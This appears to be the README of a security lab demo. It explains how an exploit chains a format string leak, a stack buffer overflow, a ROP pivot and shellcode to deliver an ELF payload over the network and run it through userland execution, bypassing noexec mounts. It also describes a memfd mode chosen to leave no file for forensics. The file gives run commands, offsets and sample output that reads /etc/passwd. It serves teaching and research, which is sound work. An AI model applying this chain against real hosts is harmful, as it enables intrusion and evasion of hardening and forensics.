# RCE Demo — noexec Bypass via Userland Execution

This rce_demo shows a realistic multi-phase network exploit that bypasses a
`noexec`-mounted partition using userland execution. The attacker
compromises a vulnerable TCP service over the network through a format
string info leak and a stack buffer overflow, then delivers and executes
an arbitrary ELF binary — all without ever calling `execve(2)`.

> **WARNING:** Every binary and script in this directory is intentionally
> insecure. They exist solely for controlled demonstrations. Do not deploy
> any of them in a real environment.

## Overview

```
 ATTACKER                               VICTIM (noexec /tmp)
 ────────                               ────────────────────
 Phase 0: Offline analysis
   nm, objdump, ELF parsing
   → resolve fixed addresses
   → scan libc for gadgets

 Phase 1: Information leak
   send "%1$p" ──────────────────────▸  greet_client()
                                        snprintf(response, 4096, user_input)
   parse leaked libc addr  ◂──────────  send(response)   ← format string bug
   compute libc_base

 Phase 2: Gadget resolution
   libc_base + offset → jmp rsp
   libc_base + offset → ret

 Phase 3: Build exploit buffer
   [padding 72B] [ret] [jmp rsp] [shellcode 255-304B]

 Phase 4: Deliver exploit
   send exploit buffer ─────────────▸  process_request()
                                       recv(fd, cmd, 4096, 0)  ← BOF into cmd[64]
                                       ret → jmp rsp → shellcode executes on stack

   send 4-byte size header ─────────▸  shellcode: recv(size)
   stream ELF payload ──────────────▸  shellcode: recv/write loop
                                       shellcode: userland_execv(fd)
                                         → mmap + memfd internally
                                         → jmp ELF entry point
                                         → PAYLOAD RUNS (no execve!)
```

## Files

| File | Purpose |
|---|---|
| `victim_server.c` | Vulnerable TCP service. Two bugs: format string in `greet_client()`, stack BOF in `process_request()`. Links `libuserland-exec.a`. No helper functions. |
| `exploit.py` | Multi-phase exploit. Info leak → gadget resolution → ROP pivot (`jmp rsp`) → inline shellcode → payload delivery. No external dependencies. |
| `payload.c` | The ELF binary delivered and executed on the victim. Prints PID/UID, kernel version, hostname, `/etc/passwd` to prove RCE. |
| `setup.sh` | Victim-side setup: creates a `tmpfs` with `noexec,nosuid,nodev` at `/tmp/noexec_rce_demo`. |
| `CMakeLists.txt` | Build config. `victim_server` is compiled with all mitigations disabled (`-no-pie -fno-stack-protector -z execstack -z norelro -O0`). |

## Exploit Techniques Used

| Technique | Detail |
|---|---|
| **Format string vulnerability** | `snprintf(buf, size, user_input)` — attacker-controlled format string leaks `rcx` (recv's syscall return address) to defeat ASLR on libc. |
| **Stack buffer overflow** | `recv(fd, buf, 4096)` into `char buf[64]` — overwrites saved RIP at offset 72. |
| **ROP pivot** | `ret` (alignment) → `jmp rsp` (from libc). Redirects execution to shellcode placed inline on the stack, past the ROP chain. |
| **Inline shellcode** | Runs on the stack (`-z execstack`). Uses only raw syscalls — fully position-independent, no PLT stubs needed. |
| **Userland exec** | `userland_execv()` maps the ELF via `mmap`/`memfd_create` and jumps to its entry point. The kernel never sees `execve(2)`, so the `noexec` mount flag is never checked. |

## Shellcode Modes

The exploit supports two modes via `--mode`:

### `--mode disk` (default)

The shellcode writes the ELF to the noexec partition, then opens and
executes it:

```
socket → recv → open("/tmp/noexec_rce_demo/payload", O_WRONLY|O_CREAT) → write → close
              → open("/tmp/noexec_rce_demo/payload", O_RDONLY) → userland_execv(fd)
```

The file is physically on the noexec mount. Direct execution returns
"Permission denied", yet `userland_execv` runs it because `execve(2)` is
never called — the kernel only checks `noexec` inside the `execve` code
path.

### `--mode memfd`

Pure in-memory — nothing touches the filesystem:

```
socket → recv → memfd_create → write(memfd) → lseek → userland_execv(memfd)
```

The ELF exists only as an anonymous inode in kernel memory. There is no
file on disk for forensics to find. The `noexec` flag is still bypassed
for the same reason: no `execve(2)`.

## Prerequisites

- Linux x86-64
- CMake ≥ 3.3, GCC, GNU as/ld
- Python ≥ 3.10 (for `int | None` syntax)
- `nm`, `objdump` (from binutils)
- Root on the victim machine (for `mount -t tmpfs`)
- The attacker needs a local copy of the same `victim_server` binary
  (for offline gadget scanning — addresses are identical because the
  binary is compiled without PIE)

## Build

From the repository root:

```bash
mkdir -p build && cd build
cmake ..
make
```

This produces:

- `build/rce_demo/victim_server` — the vulnerable service
- `build/rce_demo/payload` — the ELF to deliver and execute

## Running the Demo

### Same machine (quick test)

```bash
# Terminal 1 — set up noexec mount and start the server
sudo ./rce_demo/setup.sh
./build/rce_demo/victim_server

# Terminal 2 — run the exploit
python3 rce_demo/exploit.py                    # disk mode (default)
python3 rce_demo/exploit.py --mode memfd       # in-memory mode
```

### Two machines (network rce_demo)

**Victim machine:**

```bash
sudo ./rce_demo/setup.sh
./build/rce_demo/victim_server
```

**Attacker machine** (with the same build):

```bash
python3 rce_demo/exploit.py --target <victim-ip>
python3 rce_demo/exploit.py --target <victim-ip> --mode memfd
```

### Cleanup

```bash
sudo ./rce_demo/setup.sh cleanup
```

## Example Output

**Attacker terminal:**

```
==================================================================
  userland-exec noexec bypass — multi-phase network RCE exploit
==================================================================

  Phase 0: Offline binary analysis
    [+] BOF offset to saved RIP   : 72 bytes
    [+] userland_execv           = 0x403370
    [+] libc jmp rsp              = libc+0x3f916

  Phase 1: Information leak — triggering format string vulnerability
    [*] Sending format string: %1$p
    [*] Leaked value: 0x7e72a472bbfd
    [+] libc base = 0x7e72a4600000

  Phase 2: Gadget resolution — computing runtime addresses
    [+] jmp rsp          = 0x7e72a463f916  (libc)

  Phase 3: Exploit construction — ROP pivot + inline shellcode
    [+] Mode             : disk
    [+] Shellcode        : 304 bytes (on stack, RWX)
    [+] Layout           : padding(72) + ROP(16) + shellcode(304) = 392 bytes

  Phase 4: Exploitation — single-shot delivery
    [*] Sending exploit buffer (392 bytes) ...
    [*] Streaming ELF payload (16,392 bytes) ...

  Exploit complete
```

**Victim terminal:**

```
+---------------------------------------------------------+
|          *** PAYLOAD EXECUTED SUCCESSFULLY ***          |
|                                                         |
|  Delivered : over the network via stack BOF + ROP       |
|  Location  : /tmp/noexec_rce_demo/payload (noexec mount)   |
|  Bypass    : userland_execv() -- no execve(2) issued   |
+---------------------------------------------------------+

[RCE] PID  : 2947
[RCE] UID  : 1000
[RCE] -- /proc/version --
Linux version 6.8.0-100-generic ...
[RCE] -- /etc/hostname --
victim-host
[RCE] -- /etc/passwd (first entries) --
root:x:0:0:root:/root:/bin/bash
...
```

## Why This Works

The `noexec` mount flag is enforced by the kernel only inside the
`execve(2)` syscall path (`fs/exec.c → do_execveat_common`). It is
**not** checked by:

- `mmap(fd, PROT_READ)` — reading the ELF file, same as `cat`
- `memfd_create` + `write` — copying segments into anonymous memory
- `mmap(memfd, PROT_EXEC)` — executable mapping from the memfd
- Direct `jmp` to the mapped entry point

`userland_execv()` uses only these operations. The kernel sees ordinary
file I/O and memory mapping — never an exec request. The process image
is replaced entirely in userspace.
